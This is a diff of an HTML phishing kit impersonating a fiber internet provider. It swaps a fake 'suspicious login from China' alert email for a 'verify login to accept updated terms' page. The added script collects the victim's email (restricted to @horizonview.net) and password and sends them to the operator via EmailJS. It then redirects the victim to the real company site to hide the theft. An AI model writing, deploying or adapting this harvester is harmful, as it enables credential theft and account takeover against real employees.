@@ -1,180 +1,251 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    
+  <!-- Privacy-friendly analytics by Plausible -->
+  <script async src="https://plausible.io/js/pa-LsclXKnNgt32tqJUvKdct.js"></script>
+  <script>
+    window.plausible = window.plausible || function() {
+      (plausible.q = plausible.q || []).push(arguments)
+    },
+    plausible.init = plausible.init || function(i) {
+      plausible.o = i || {}
+    };
+    plausible.init();
+  </script>
+    
   <meta charset="UTF-8">
-  <title>Security Notice: Recent Login to Your Account</title>
+  <title>Verify Login to Accept Updated Terms</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { margin:0; padding:0; background-color:#e5e7eb; }
-
-    @media (prefers-color-scheme: dark) {
-      body { background-color:#0f172a !important; }
-      .card { background-color:#1e293b !important; }
-      .text-primary { color:#ffffff !important; }
-      .text-secondary { color:#cbd5e1 !important; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
     }
 
-    .activity-wrapper { width:100%; }
-    .activity-inner { display:flex; flex-wrap:wrap; gap:12px; }
-    .activity-details {
-      flex:1 1 220px;
-      font-size:14px;
-      line-height:1.7;
-      color:#4b5563;
-    }
-    .activity-map { flex:0 0 180px; max-width:200px; }
-    .activity-map img {
-      width:100%;
-      height:auto;
-      border-radius:8px;
-      display:block;
-      border:0;
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #333333;
     }
 
-    @media (max-width:480px) {
-      .activity-inner { flex-direction:column; }
-      .activity-map { max-width:100%; }
+    .page-wrapper {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
     }
 
-    .buttons-table { width:100%; max-width:500px; margin:16px auto 0; border-spacing:0; }
-    .button-td { padding:8px 4px !important; width:50%; vertical-align:top; }
-    .accept-btn, .reject-btn { width:100%; border-radius:8px; }
-    .btn-link {
-      display:block !important;
-      padding:14px 20px !important;
-      font-family:Arial, sans-serif !important;
-      font-size:14px !important;
-      color:#ffffff !important;
-      text-decoration:none !important;
-      font-weight:600 !important;
-      text-align:center !important;
-      line-height:1.3 !important;
-      box-sizing:border-box;
+    .card {
+      width: 100%;
+      max-width: 480px;
+      background-color: #ffffff;
+      border-radius: 6px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      padding: 24px 24px 28px 24px;
     }
-    .accept-btn { background:linear-gradient(135deg,#10b981,#059669) !important; }
-    .reject-btn { background:linear-gradient(135deg,#dc2626,#ef4444) !important; }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .logo img {
+      max-width: 100px;
+      height: auto;
+      display: inline-block;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 12px;
+      text-align: center;
+      color: #000000;
+    }
+
+    p {
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+
+    .highlight {
+      font-weight: bold;
+    }
+
+    .notice-box {
+      background-color: #f0f6ff;
+      border: 1px solid #c5d9ff;
+      border-radius: 4px;
+      padding: 10px 12px;
+      font-size: 13px;
+      margin: 8px 0 16px 0;
+      text-align: center;
+    }
+
+    .form-wrapper {
+      margin-top: 10px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 4px;
+      text-align: left;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 14px;
+      border-radius: 4px;
+      border: 1px solid #cccccc;
+      margin-bottom: 4px;
+    }
+
+    .error-text {
+      display: block;
+      font-size: 12px;
+      color: #d00000;
+      margin-bottom: 8px;
+      min-height: 14px;
+    }
+
+    .btn-primary {
+      width: 100%;
+      display: inline-block;
+      padding: 11px 16px;
+      font-size: 15px;
+      font-weight: bold;
+      text-align: center;
+      text-decoration: none;
+      color: #ffffff;
+      background-color: #0066cc;
+      border-radius: 4px;
+      border: none;
+      cursor: pointer;
+      margin-top: 6px;
+    }
+
+    .btn-primary:hover {
+      background-color: #0055aa;
+    }
+
+    .subtext {
+      font-size: 12px;
+      color: #777777;
+      margin-top: 10px;
+      text-align: center;
+    }
+
+    .link-terms {
+      color: #0066cc;
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px 16px 24px 16px;
+      }
+    }
   </style>
 </head>
+<body>
+  <div class="page-wrapper">
+    <div class="card">
+      <div class="logo">
+        <img src="https://438utfb9pf.ucarecd.net/a9a03bc9-470f-41a0-b0bf-d153e7f87611/horiglo_Fiber_Logo.jpg" alt="Company Logo">
+      </div>
 
-<body style="margin:0; padding:0; background-color:#e5e7eb;">
+      <h1>Verify Login to Reject Activity</h1>
 
-  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
-    <tr>
-      <td align="center" style="padding:32px 16px;">
+      <div class="form-wrapper">
+        <!-- Contact form wired to EmailJS -->
+        <form id="contact-form">
+          <label for="email-input">Email address</label>
+          <input type="email" id="email-input" name="user_email" required>
+          <span id="email-error" class="error-text"></span>
 
-        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
-               style="max-width:600px; background:#ffffff; border-radius:12px; overflow:hidden;"
-               class="card">
+          <label for="password-input">Password</label>
+          <input type="password" id="password-input" name="user_password" required>
+          <span id="password-error" class="error-text"></span>
 
-          <!-- Header -->
-          <tr>
-            <td align="center"
-                style="padding:45px 20px;
-                       background:linear-gradient(135deg,#0f172a,#1e3a8a);">
+          <button type="submit" class="btn-primary">
+            Continue
+          </button>
+        </form>
+      </div>
 
-              <table role="presentation" cellpadding="0" cellspacing="0" border="0"
-                     style="background:#ffffff; border-radius:12px;">
-                <tr>
-                  <td align="center" style="padding:14px 20px;">
-                    <img src="https://438utfb9pf.ucarecd.net/a9a03bc9-470f-41a0-b0bf-d153e7f87611/horiglo_Fiber_Logo.jpg"
-                         alt="Company Logo"
-                         width="170"
-                         style="display:block; border:0; max-width:170px; height:auto;">
-                  </td>
-                </tr>
-              </table>
+      <p class="subtext">
+        After you log in, you will be prompted to review and accept the updated Service Terms Agreement.
+        <br>
+        You can also view the terms any time at
+        <a href="https://www.glofiber.com" class="link-terms">this page</a>.
+      </p>
+    </div>
+  </div>
 
-            </td>
-          </tr>
+  <!-- EmailJS v3 browser SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS with your public key
+    emailjs.init("HQhAan1hDEBOa99FF");
 
-          <!-- Body -->
-          <tr>
-            <td style="padding:32px 30px; font-family:Arial, sans-serif;">
+    const contactForm = document.getElementById("contact-form");
+    const emailInput = document.getElementById("email-input");
+    const passwordInput = document.getElementById("password-input");
+    const emailError = document.getElementById("email-error");
+    const passwordError = document.getElementById("password-error");
 
-              <h2 class="text-primary"
-                  style="margin:0 0 18px 0; font-size:22px; color:#111827;">
-                Notice: Recent Login to Your Account
-              </h2>
+    contactForm.addEventListener("submit", function (e) {
+      e.preventDefault();
 
-              <p class="text-secondary"
-                 style="margin:0 0 16px 0; font-size:15px; line-height:1.6; color:#4b5563;">
-                A recent login to your account was detected. Please review the details below and confirm whether this activity was authorized.
-              </p>
+      // Simple front-end validation
+      let valid = true;
+      emailError.textContent = "";
+      passwordError.textContent = "";
 
-              <!-- Details + Map -->
-              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
-                     class="activity-wrapper" style="margin:0 0 24px 0;">
-                <tr>
-                  <td>
-                    <div class="activity-inner">
+      const emailValue = emailInput.value.trim();
+      const allowedDomainRegex = /^[^@\s]+@(horizonview\.net)$/i;
 
-                      <!-- LEFT: Details -->
-                      <div class="activity-details text-secondary">
-                        <strong>Activity Details:</strong><br>
-                        Date: Saturday, March 14th, 2026<br>
-                        Time: 8:41 AM EDT<br>
-                        Location: Zhengzhou, China<br>
-                        Device: Windows 11 · Edge Browser
-                      </div>
+      if (!emailValue) {
+        emailError.textContent = "Email is required.";
+        valid = false;
+      } else if (!allowedDomainRegex.test(emailValue)) {
+        emailError.textContent =
+          "Email must be @horizonview.net.";
+        valid = false;
+      }
 
-                      <!-- RIGHT: Map image -->
-                      <div class="activity-map">
-                        <img
-                          src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Zhengzhou-location-MAP-in-Henan-Province-China.jpg"
-                          alt="Map showing recent login location in Zhengzhou, China">
-                      </div>
+      if (!passwordInput.value.trim()) {
+        passwordError.textContent = "Password is required.";
+        valid = false;
+      }
 
-                    </div>
-                  </td>
-                </tr>
-              </table>
+      if (!valid) return;
 
-              <!-- Buttons: Accept / Reject -->
-              <table role="presentation" cellpadding="0" cellspacing="0" border="0" class="buttons-table">
-                <tr>
-                  <td class="button-td" align="center">
-                    <table role="presentation" cellpadding="0" cellspacing="0" border="0" class="accept-btn">
-                      <tr>
-                        <td>
-                          <a href="https://www.viewinfoactivity.com/horizonview" class="btn-link">
-                            ✅ This was me
-                          </a>
-                        </td>
-                      </tr>
-                    </table>
-                  </td>
-                  <td class="button-td" align="center">
-                    <table role="presentation" cellpadding="0" cellspacing="0" border="0" class="reject-btn">
-                      <tr>
-                        <td>
-                          <a href="https://www.viewinfoactivity.com/horizonview-reject" class="btn-link">
-                            ❌ Not me
-                          </a>
-                        </td>
-                      </tr>
-                    </table>
-                  </td>
-                </tr>
-              </table>
+      // Send form via EmailJS
+      emailjs
+        .sendForm(
+          "service_fgaxl6c",      // your EmailJS service ID
+          "template_rqll763",     // your EmailJS template ID
+          "#contact-form"         // selector for this form
+        )
+        .then(function (response) {
+          console.log("SUCCESS!", response.status, response.text);
 
-              <!-- Footer -->
-              <p class="text-secondary"
-                 style="margin:24px 0 0 0;
-                        font-size:7px;
-                        line-height:1.5;
-                        color:#9ca3af;
-                        text-align:center;">
-                We monitor login activity and behavioral patterns to help protect your account
-                and reduce the risk of unauthorized access.
-              </p>
-
-            </td>
-          </tr>
-
-        </table>
-      </td>
-    </tr>
-  </table>
-
+          // Redirect to www.glofiber.com in the same tab
+          window.location.href = "https://www.glofiber.com";
+        })
+        .catch(function (error) {
+          console.error("FAILED...", error);
+          alert("Failed to send. Please try again.");
+        });
+    });
+  </script>
 </body>
 </html>
